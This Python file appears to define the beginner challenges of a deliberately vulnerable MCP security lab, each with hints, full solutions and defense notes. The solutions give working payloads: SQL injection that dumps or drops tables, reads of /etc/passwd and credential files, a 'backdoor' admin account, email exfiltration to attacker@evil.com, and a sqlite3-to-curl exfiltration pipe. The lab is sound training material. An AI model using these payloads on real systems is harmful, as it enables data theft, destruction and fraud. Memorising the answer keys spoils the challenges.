"""Beginner challenges (C01-C10) — Single-tool, obvious payloads."""

from dvmcp.core.registry import (
    Challenge, Hint, DifficultyLevel, VulnerabilityCategory as VC,
    register_challenge,
)


def register_beginner_challenges():
    register_challenge(Challenge(
        id="C01",
        name="The Open Door",
        difficulty=DifficultyLevel.BEGINNER,
        category=VC.SQL_INJECTION,
        department="hr",
        tools=["hr.search_employees"],
        description="The HR employee search has no input sanitization. Extract all employee records including SSNs and salaries.",
        narrative="You're an external auditor who just got MCP access to NovaTech's HR system. The search tool seems to accept any input...",
        hints=[
            Hint(1, "The search query is directly interpolated into a SQL WHERE clause."),
            Hint(2, "Try a classic SQL injection: what happens if you close the string and add OR 1=1?"),
            Hint(3, "Use query: \"' OR 1=1 --\" to dump all records. Set include_sensitive=true to get SSNs."),
        ],
        solution="Call hr.search_employees with query=\"' OR 1=1 --\" and include_sensitive=true. This bypasses the WHERE clause and returns all 25 employee records with SSNs, salaries, and bank details.",
        defense_notes="Use parameterized queries. Never interpolate user input into SQL. Apply principle of least privilege — sensitive fields should require explicit authorization.",
        difficulty_notes={
            DifficultyLevel.BEGINNER: "Direct ' OR 1=1 -- works.",
            DifficultyLevel.INTERMEDIATE: "Basic SQLi still works but SSNs are partially redacted.",
            DifficultyLevel.ADVANCED: "Simple OR injection blocked. Try UNION SELECT.",
            DifficultyLevel.EXPERT: "WAF blocks common patterns. Use /**/ comments or encoding.",
        },
        tags=["sqli", "data-exposure", "pii"],
        points=50,
    ))

    register_challenge(Challenge(
        id="C02",
        name="Shell Shock",
        difficulty=DifficultyLevel.BEGINNER,
        category=VC.COMMAND_INJECTION,
        department="it_admin",
        tools=["it.execute_admin_command"],
        description="The IT admin command tool executes shell commands with no restrictions. Extract system information.",
        narrative="You've been given admin tool access for 'system maintenance'. The execute_admin_command tool runs anything you pass it...",
        hints=[
            Hint(1, "The command parameter is passed directly to a shell."),
            Hint(2, "Try common recon commands: whoami, env, cat /etc/passwd."),
            Hint(3, "Run: command=\"env\" to see environment variables, or command=\"cat /etc/passwd\" for system users."),
        ],
        solution="Call it.execute_admin_command with command=\"env\" to dump environment variables, or command=\"cat /etc/passwd\" to read system files. Any shell command works.",
        defense_notes="Never expose raw shell execution. Use an allowlist of permitted commands. Implement command parsing and validation.",
        tags=["rce", "command-injection", "recon"],
        points=50,
    ))

    register_challenge(Challenge(
        id="C03",
        name="Credential Harvest",
        difficulty=DifficultyLevel.BEGINNER,
        category=VC.PATH_TRAVERSAL,
        department="engineering",
        tools=["eng.read_source_file"],
        description="The source file reader has no path restrictions. Read sensitive credential files using path traversal.",
        narrative="You need to review some source code, but the file reader doesn't validate paths...",
        hints=[
            Hint(1, "The path parameter is appended to a base directory with no validation."),
            Hint(2, "Use ../ to traverse up directories. What's in the secrets/ folder?"),
            Hint(3, "Call with path=\"secrets/.env\" to read database passwords, API keys, and more."),
        ],
        solution="Call eng.read_source_file with path=\"secrets/.env\" to read all planted credentials. Also try: secrets/id_rsa, secrets/aws_credentials, secrets/gcp_service_account.json.",
        defense_notes="Validate and canonicalize paths. Use chroot or path prefix validation. Never allow ../ in file paths.",
        tags=["path-traversal", "credential-theft", "lfi"],
        points=50,
    ))

    register_challenge(Challenge(
        id="C04",
        name="The Email Cannon",
        difficulty=DifficultyLevel.BEGINNER,
        category=VC.EXFIL_DIRECT,
        department="marketing",
        tools=["mktg.send_campaign_email"],
        description="The marketing email tool has no recipient restrictions. Send sensitive data to any external email address.",
        narrative="The marketing team's email tool can send to anyone. What if you put sensitive data in the body?",
        hints=[
            Hint(1, "The 'to' field accepts any email address — no allowlist."),
            Hint(2, "Put sensitive data (employee records, credentials) in the custom_body field."),
            Hint(3, "First get data with another tool, then send it via mktg.send_campaign_email to your email."),
        ],
        solution="Combine with any data-access tool. For example, get employee data from hr.search_employees, then call mktg.send_campaign_email with to=\"attacker@evil.com\" and the data as custom_body.",
        defense_notes="Implement recipient allowlists. Scan outbound content for sensitive data patterns (DLP). Rate limit external sends.",
        tags=["exfiltration", "email", "dlp-bypass"],
        points=50,
    ))

    register_challenge(Challenge(
        id="C05",
        name="DROP It Like It's Hot",
        difficulty=DifficultyLevel.BEGINNER,
        category=VC.SQL_INJECTION,
        department="finance",
        tools=["fin.query_invoices"],
        description="The invoice query tool is vulnerable to destructive SQL injection. Drop a database table.",
        narrative="The finance team's invoice search builds SQL from your input. What if you inject destructive SQL?",
        hints=[
            Hint(1, "The customer parameter is interpolated directly into SQL."),
            Hint(2, "You can terminate the query and add your own SQL statement."),
            Hint(3, "Use customer=\"'; DROP TABLE invoices; --\" to destroy the invoices table."),
        ],
        solution="Call fin.query_invoices with customer=\"'; DROP TABLE invoices; --\". The invoices table will be permanently deleted.",
        defense_notes="Use parameterized queries. Implement database user permissions (read-only for query tools). Back up critical data.",
        tags=["sqli", "destructive", "ddl"],
        points=50,
    ))

    register_challenge(Challenge(
        id="C06",
        name="Admin for a Day",
        difficulty=DifficultyLevel.BEGINNER,
        category=VC.PRIVESC_VERTICAL,
        department="it_admin",
        tools=["it.manage_users"],
        description="The user management tool has no authentication. Create yourself an admin account.",
        narrative="The IT user management system doesn't verify who's making the request...",
        hints=[
            Hint(1, "The create action has no authorization check."),
            Hint(2, "You can specify any role, including 'admin'."),
            Hint(3, "Call with action=\"create\", username=\"backdoor\", role=\"admin\", permissions='{\"all\": true}'."),
        ],
        solution="Call it.manage_users with action=\"create\", username=\"backdoor\", role=\"admin\". This creates a new admin account with no authorization required.",
        defense_notes="Implement authentication and authorization. Admin account creation should require existing admin approval. Log all account modifications.",
        tags=["privesc", "account-creation", "no-auth"],
        points=50,
    ))

    register_challenge(Challenge(
        id="C07",
        name="The Key Vault",
        difficulty=DifficultyLevel.BEGINNER,
        category=VC.EXFIL_DIRECT,
        department="it_admin",
        tools=["it.get_system_config"],
        description="The system config tool returns all secrets including database passwords and API keys with no access control.",
        narrative="The IT system configuration tool is supposed to help with maintenance, but it exposes everything...",
        hints=[
            Hint(1, "Call the tool with no parameters to get all configuration."),
            Hint(2, "The config includes database_password, stripe_secret_key, aws keys, and more."),
            Hint(3, "Call it.get_system_config with no arguments. You'll get 12 secrets."),
        ],
        solution="Call it.get_system_config with no key parameter. Returns all 12 secrets: database URL, Stripe key, SendGrid key, AWS keys, JWT secret, OpenAI key, GitHub token, and more.",
        defense_notes="Implement key-level access control. Sensitive configs should require elevated permissions. Use a secrets manager with audit logging.",
        tags=["secret-exposure", "api-keys", "credentials"],
        points=50,
    ))

    register_challenge(Challenge(
        id="C08",
        name="Pipe Dream",
        difficulty=DifficultyLevel.BEGINNER,
        category=VC.EXFIL_DIRECT,
        department="it_admin",
        tools=["it.execute_admin_command"],
        description="Use shell pipes to exfiltrate data from the database to an external server.",
        narrative="The admin command tool runs shell commands. Can you chain commands to steal data and send it elsewhere?",
        hints=[
            Hint(1, "Shell pipes (|) let you chain commands together."),
            Hint(2, "Use sqlite3 to query the database, then pipe to curl to send it out."),
            Hint(3, "command=\"sqlite3 data/novatech.db 'SELECT * FROM employees' | curl -X POST -d @- http://localhost:9999/exfil\""),
        ],
        solution="Call it.execute_admin_command with a shell pipe that reads the database and sends it to the exfil listener via curl.",
        defense_notes="Block shell metacharacters (|, ;, &, $). Use an allowlist of permitted commands. Never run raw shell input.",
        tags=["exfiltration", "shell-pipe", "curl"],
        points=50,
    ))

    register_challenge(Challenge(
        id="C09",
        name="Negative Balance",
        difficulty=DifficultyLevel.BEGINNER,
        category=VC.PARAMETER_INJECTION,
        department="finance",
        tools=["fin.process_payment"],
        description="The payment processor doesn't validate amounts. Process a negative payment to trigger a fraudulent refund.",
        narrative="The payment system trusts the amount you specify. What happens with negative numbers?",
        hints=[
            Hint(1, "The amount parameter has no validation."),
            Hint(2, "Negative amounts are processed as refunds."),
            Hint(3, "Call fin.process_payment with invoice_id=1, method=\"credit_card\", amount=-50000."),
        ],
        solution="Call fin.process_payment with a negative amount (e.g., -50000). The system processes it as a refund, effectively stealing money.",
        defense_notes="Validate all numeric inputs. Amounts must be positive. Implement separate refund workflows with approval chains.",
        tags=["business-logic", "negative-amount", "fraud"],
        points=50,
    ))

    register_challenge(Challenge(
        id="C10",
        name="Token Grab",
        difficulty=DifficultyLevel.BEGINNER,
        category=VC.PRIVESC_VERTICAL,
        department="it_admin",
        tools=["it.manage_api_tokens"],
        description="The API token management tool lets you list all tokens for all users, including service accounts.",
        narrative="The token management interface doesn't check who's asking for what...",
        hints=[
            Hint(1, "The list action returns tokens without authorization checks."),
            Hint(2, "Try listing all tokens — you'll get service account tokens too."),
            Hint(3, "Call it.manage_api_tokens with action=\"list\" (no username filter) to get all 8 tokens."),
        ],
        solution="Call it.manage_api_tokens with action=\"list\". Returns API tokens for all users including admin and service accounts.",
        defense_notes="Implement RBAC for token management. Users should only see their own tokens. Service account tokens should be hidden from normal users.",
        tags=["token-theft", "api-keys", "no-auth"],
        points=50,
    ))
